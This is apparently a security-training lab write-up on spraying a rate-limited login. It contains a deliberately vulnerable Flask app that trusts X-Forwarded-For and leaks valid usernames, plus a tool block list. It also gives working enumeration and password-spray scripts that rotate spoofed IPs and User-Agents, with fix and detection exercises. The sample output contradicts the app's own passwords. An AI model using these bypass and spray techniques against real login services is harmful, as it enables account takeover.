---
title: "Credential Attack Lab — Spray a Rate-Limited Login with IP Blocking Active"
tags: [credential-attack, lab, Docker, password-spray, rate-limiting, IP-blocking,
       bypass, authentication, ATT&CK-T1110, brute-force, Python]
module: 04-BroadSurface-01
day: 168
related_topics:
  - Credential Stuffing and Spraying (Day 166)
  - Rate Limiting Bypass (Day 167)
  - JWT Advanced Attacks (Day 169)
  - Auth Attack Detection (Day 176)
---

# Day 168 — Credential Attack Lab

> "The lab has real defences. IP blocking after 5 failures. User-agent
> fingerprinting. Account lockout at 3 attempts. You are not going to brute-
> force this. You are going to think about what the server is actually measuring,
> find the gap, and go through it. That is the skill."
>
> — Ghost

---

## Goals

By the end of this lab you will be able to:

1. Fingerprint the lab's rate limiting mechanism and lockout policy.
2. Identify and enumerate valid usernames without triggering lockout.
3. Execute a password spray that bypasses the IP block and lockout policy.
4. Recover a valid credential and use it to authenticate.
5. Write a finding report for the bypass technique you used.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Credential stuffing and spraying | Day 166 |
| Rate limiting bypass techniques | Day 167 |
| Python requests | Days 149, 152 |
| Docker Compose | Days 150–151 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-01/samples/credential-attack-lab/
docker compose up --build -d

# Verify services are running
docker compose ps
# NAME                     STATUS
# credential-attack-lab-app-1   Up 0.0.0.0:8000->8000/tcp
# credential-attack-lab-redis-1 Up 6379/tcp
```

The lab runs at **http://localhost:8000**.

### Lab Architecture

```yaml
# docker-compose.yml
version: "3.9"
services:
  app:
    build: .
    ports:
      - "8000:8000"
    environment:
      REDIS_URL: redis://redis:6379
      SECRET_KEY: "lab-secret"
    depends_on:
      - redis
    networks:
      - lab
  redis:
    image: redis:7-alpine
    networks:
      - lab
networks:
  lab:
```

### Lab Application (Flask + Redis)

```python
# app.py — intentionally vulnerable for lab purposes
from __future__ import annotations

import hashlib
import os
import time
from functools import wraps

import redis
from flask import Flask, jsonify, request, session

app = Flask(__name__)
app.secret_key = os.environ["SECRET_KEY"]
r = redis.from_url(os.environ["REDIS_URL"])

# ── Users ─────────────────────────────────────────────────────────────────
USERS: dict[str, str] = {
    "alice@lab.local":   hashlib.sha256(b"Autumn2023!").hexdigest(),
    "bob@lab.local":     hashlib.sha256(b"bob_pass_123").hexdigest(),
    "carol@lab.local":   hashlib.sha256(b"Welcome1").hexdigest(),
    "dave@lab.local":    hashlib.sha256(b"dave_unique_91").hexdigest(),
    "eve@lab.local":     hashlib.sha256(b"Company2024!").hexdigest(),
    "admin@lab.local":   hashlib.sha256(b"AdMin_S3cur3!").hexdigest(),
}

# ── Rate Limiting ─────────────────────────────────────────────────────────
IP_LIMIT = 5            # Max failures per IP per window
ACCOUNT_LIMIT = 3       # Max failures per account per window
WINDOW_SEC = 60         # 1-minute window
BLOCK_SEC = 300         # 5-minute IP block after limit exceeded
UA_BLOCK_LIST = [
    "python-requests",  # Block default requests user-agent
    "hydra",
    "burpsuite",
    "sqlmap",
]


def get_client_ip() -> str:
    """Get client IP — intentionally trusts X-Forwarded-For (lab vulnerability)."""
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr


def check_rate_limit(ip: str, account: str) -> tuple[bool, str]:
    """Returns (blocked, reason)."""
    # Check UA blocklist
    ua = request.headers.get("User-Agent", "")
    for blocked_ua in UA_BLOCK_LIST:
        if blocked_ua.lower() in ua.lower():
            return True, f"User-Agent blocked: {blocked_ua}"

    # Check IP block
    ip_block_key = f"block:ip:{ip}"
    if r.exists(ip_block_key):
        ttl = r.ttl(ip_block_key)
        return True, f"IP blocked. Retry after {ttl}s."

    # Check IP failure count
    ip_fail_key = f"fail:ip:{ip}"
    ip_fails = int(r.get(ip_fail_key) or 0)
    if ip_fails >= IP_LIMIT:
        r.setex(ip_block_key, BLOCK_SEC, "1")
        return True, "IP rate limit exceeded."

    # Check account lockout
    acct_key = f"fail:acct:{account}"
    acct_fails = int(r.get(acct_key) or 0)
    if acct_fails >= ACCOUNT_LIMIT:
        return True, "Account locked. Try again later."

    return False, ""


def record_failure(ip: str, account: str) -> None:
    pipe = r.pipeline()
    ip_key = f"fail:ip:{ip}"
    acct_key = f"fail:acct:{account}"
    pipe.incr(ip_key)
    pipe.expire(ip_key, WINDOW_SEC)
    pipe.incr(acct_key)
    pipe.expire(acct_key, WINDOW_SEC)
    pipe.execute()


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "").lower().strip()
    password = data.get("password", "")
    ip = get_client_ip()

    blocked, reason = check_rate_limit(ip, email)
    if blocked:
        return jsonify({"error": reason}), 429

    pw_hash = hashlib.sha256(password.encode()).hexdigest()
    stored_hash = USERS.get(email)

    if stored_hash and pw_hash == stored_hash:
        session["user"] = email
        return jsonify({"message": "Login successful", "user": email}), 200

    # Different message for unknown user vs wrong password (enumeration bug)
    if email not in USERS:
        return jsonify({"error": "User not found"}), 404

    record_failure(ip, email)
    return jsonify({"error": "Invalid password"}), 401


@app.route("/profile")
def profile():
    user = session.get("user")
    if not user:
        return jsonify({"error": "Not authenticated"}), 401
    return jsonify({"user": user, "flag": "FLAG{credential_spray_successful}"}), 200
```

---

## Objective 1 — Enumerate Valid Usernames

The login endpoint returns different messages for unknown users (`404 User not
found`) vs wrong passwords (`401 Invalid password`). This is a username
enumeration bug.

### Step 1.1 — Confirm the enumeration

```bash
# Test with a known email format (guess from company domain)
curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"email":"alice@lab.local","password":"wrong"}'
# → {"error": "Invalid password"}  ← USER EXISTS

curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"email":"nonexistent@lab.local","password":"wrong"}'
# → {"error": "User not found"}  ← USER DOES NOT EXIST
```

### Step 1.2 — Enumerate all valid accounts

```python
#!/usr/bin/env python3
"""Lab Objective 1 — Username enumeration."""
from __future__ import annotations

import time
import requests

URL = "http://localhost:8000/login"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"}

# Generate candidate list: common first names @ lab.local
candidates = [
    f"{name}@lab.local"
    for name in ["alice", "bob", "carol", "dave", "eve", "frank",
                 "grace", "henry", "iris", "jack", "admin", "test",
                 "user", "support", "info", "noreply"]
]

valid_users: list[str] = []

for email in candidates:
    r = requests.post(URL,
                      json={"email": email, "password": "probe_only"},
                      headers=HEADERS, timeout=5)
    if r.status_code == 401:   # "Invalid password" → user exists
        valid_users.append(email)
        print(f"[VALID] {email}")
    elif r.status_code == 404:
        print(f"[MISS]  {email}")
    elif r.status_code == 429:
        print(f"[LIMIT] {email} — backing off")
        time.sleep(10)
    time.sleep(0.5)

print(f"\n[+] Valid users found: {valid_users}")
```

**Expected result:** 6 valid users discovered (`alice`, `bob`, `carol`, `dave`,
`eve`, `admin`).

---

## Objective 2 — Fingerprint the Rate Limiting Mechanism

### Step 2.1 — IP-based limit

```bash
for i in $(seq 1 8); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/login \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0" \
    -d '{"email":"alice@lab.local","password":"wrong"}')
  echo "Attempt $i from real IP: $STATUS"
done
# After 5 failures: 429 IP rate limit exceeded
```

### Step 2.2 — XFF bypass test

```bash
curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -d '{"email":"alice@lab.local","password":"wrong"}'
# → 401 Invalid password (not 429) ← XFF bypass works
```

### Step 2.3 — Account lockout test

```bash
# Three failures on the same account
for i in 1 2 3; do
  curl -s -X POST http://localhost:8000/login \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0" \
    -H "X-Forwarded-For: 10.0.${i}.1" \
    -d '{"email":"bob@lab.local","password":"wrong"}'
done

# Fourth attempt — account locked
curl -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 10.0.99.1" \
  -d '{"email":"bob@lab.local","password":"wrong"}'
# → 429 Account locked. Try again later.
```

**Findings so far:**
- IP limit: 5 failures per minute → bypassed by XFF rotation
- Account lockout: 3 failures per minute → must limit to ≤ 2 per account per window
- User-Agent block: filters `python-requests` → use real browser UA

---

## Objective 3 — Execute the Spray

Build a spray that:
1. Rotates `X-Forwarded-For` to avoid IP block
2. Stays at ≤ 2 attempts per account per 60-second window
3. Uses a real browser User-Agent
4. Tries common corporate passwords against all 6 valid accounts

```python
#!/usr/bin/env python3
"""Lab Objective 3 — Rate-limited password spray with XFF bypass."""
from __future__ import annotations

import random
import time
import requests

URL = "http://localhost:8000/login"
VALID_USERS = [
    "alice@lab.local", "bob@lab.local", "carol@lab.local",
    "dave@lab.local", "eve@lab.local", "admin@lab.local",
]
PASSWORDS = [
    "Spring2023!", "Autumn2023!", "Winter2023!", "Summer2023!",
    "Company2024!", "Welcome1", "Welcome1!", "P@ssword1",
    "LabPass1!", "ChangeMe1", "January2024!", "February2024!",
]
# Stay at 2 attempts per account per 60-second window
MAX_PER_ACCOUNT = 2
WINDOW_SEC = 62   # slightly longer than server window to be safe
DELAY_BETWEEN_REQUESTS = 3.0   # seconds between each request


def random_xff() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,254)}." \
           f"{random.randint(0,254)}.{random.randint(1,254)}"


def spray_attempt(email: str, password: str) -> tuple[int, str]:
    r = requests.post(
        URL,
        json={"email": email, "password": password},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "X-Forwarded-For": random_xff(),
            "Content-Type": "application/json",
        },
        timeout=10,
    )
    return r.status_code, r.text


def main() -> None:
    found: list[tuple[str, str]] = []
    # Track per-account attempts in this window
    account_attempts: dict[str, int] = {u: 0 for u in VALID_USERS}
    window_start = time.time()

    for password in PASSWORDS:
        print(f"\n[*] Spraying: {password}")

        # Check if window has elapsed — reset account counters
        if time.time() - window_start > WINDOW_SEC:
            account_attempts = {u: 0 for u in VALID_USERS}
            window_start = time.time()
            print("[*] Window reset — account counters cleared")

        for email in VALID_USERS:
            if account_attempts[email] >= MAX_PER_ACCOUNT:
                print(f"    [SKIP] {email} — at limit for this window")
                continue

            status, body = spray_attempt(email, password)
            account_attempts[email] += 1

            if status == 200:
                print(f"    [HIT!] {email}:{password}")
                found.append((email, password))
            elif status == 429:
                print(f"    [LIMIT] {email} — backing off 65s")
                time.sleep(65)
            else:
                print(f"    [miss] {email} → {status}")

            time.sleep(DELAY_BETWEEN_REQUESTS)

        # After each password round, pause to let the window partially reset
        print(f"[*] Round complete. Pausing {WINDOW_SEC}s...")
        time.sleep(WINDOW_SEC)

    print(f"\n[+] Credentials found: {found}")


if __name__ == "__main__":
    main()
```

### Expected Output

```
[*] Spraying: Autumn2023!
    [miss] alice@lab.local → 401
    [miss] bob@lab.local → 401
    [miss] carol@lab.local → 401
    [miss] dave@lab.local → 401
    [miss] eve@lab.local → 401
    [miss] admin@lab.local → 401
[*] Round complete. Pausing 62s...

[*] Spraying: Welcome1
    [miss] alice@lab.local → 401
    ...
    [HIT!] carol@lab.local:Welcome1
    ...

[+] Credentials found: [('carol@lab.local', 'Welcome1'), ('eve@lab.local', 'Company2024!')]
```

---

## Objective 4 — Authenticate and Capture the Flag

```bash
# Use discovered credentials to get authenticated session
curl -c /tmp/lab_cookies.txt \
  -s -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -d '{"email":"carol@lab.local","password":"Welcome1"}'
# → {"message": "Login successful", "user": "carol@lab.local"}

# Access protected resource
curl -b /tmp/lab_cookies.txt \
  -s http://localhost:8000/profile | jq .
# → {"user": "carol@lab.local", "flag": "FLAG{credential_spray_successful}"}
```

---

## Objective 5 — Write the Finding Report

Document your findings using the Day 161 template. Key findings to cover:

**Finding 1:** Username enumeration via differential response messages
(HTTP 404 vs 401). CVSS: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → 5.3 (Medium)

**Finding 2:** Rate limit bypass via `X-Forwarded-For` header spoofing on the
login endpoint. CVSS: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → 9.1 (Critical
when chained with weak passwords).

**Chain:** Username enumeration → XFF bypass → password spray → valid credential
→ authenticated access.

---

## Key Takeaways

1. **Username enumeration halves the attacker's problem.** Without a valid
   user list, spraying is a guess. With one, every attempt is targeted.
2. **Differential error messages are not a small issue.** They directly enable
   enumeration and are rated Medium/High depending on how sensitive the account
   base is.
3. **XFF bypass is consistently the first thing to try on any login endpoint.**
   If the server trusts it, the IP block is completely neutralised.
4. **Account lockout creates a timing constraint, not a barrier.** The attacker
   slows down — they do not stop.
5. **Low-and-slow wins every time against threshold-based controls.** The defence
   needs account-behaviour anomaly detection, not just threshold counters.

---

## Exercises

1. Modify the spray script to collect response times and flag accounts that
   respond slower than average — this often indicates a valid credential that
   triggered a slower bcrypt comparison.
2. The lab blocks the User-Agent string `python-requests`. Add User-Agent
   rotation to the spray script. What other UA strings does the lab block?
   (Hint: check `UA_BLOCK_LIST` in `app.py`.)
3. Write the Sigma rule that would detect this spray campaign based on the
   Redis failure-tracking data exposed in server logs.
4. Modify `app.py` to fix both vulnerabilities: (a) return the same error
   message regardless of whether the user exists; (b) key the rate limit on
   both the direct TCP source IP (ignoring XFF) and the account.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q168.1, Q168.2 …).
> Follow-up questions use hierarchical numbering (Q168.1.1, Q168.1.2 …).

---

## Navigation

← Previous: [Day 167 — Rate Limiting Bypass](DAY-0167-Rate-Limiting-Bypass.md)
→ Next: [Day 169 — JWT Advanced Attacks](DAY-0169-JWT-Advanced-Attacks.md)
